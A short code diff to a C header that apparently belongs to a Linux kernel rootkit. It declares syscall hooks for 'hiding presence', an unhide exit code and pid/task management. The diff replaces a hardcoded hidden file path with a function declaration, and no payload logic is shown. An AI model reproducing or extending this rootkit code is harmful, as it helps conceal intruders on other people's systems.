@@ -40,7 +40,6 @@
 #define prerr_once(fmt, ...);
 #endif
 
-#define TTYFILE "/var/.o4udk"
 #define EXIT_UNHIDE 1
 #define OBFLEN(x) (sizeof(x)/sizeof(char*))
 #define OBFLEN2(x) sizeof(x)
@@ -110,6 +109,7 @@ struct kernel_syscalls {
 /** hooks, hiding presence and so */
 bool sys_init(void);
 void sys_deinit(void);
+char *sys_ttyfile(void);
 
 /** pid,task management */
 bool kv_pid_init(struct kernel_syscalls *fn_addr);
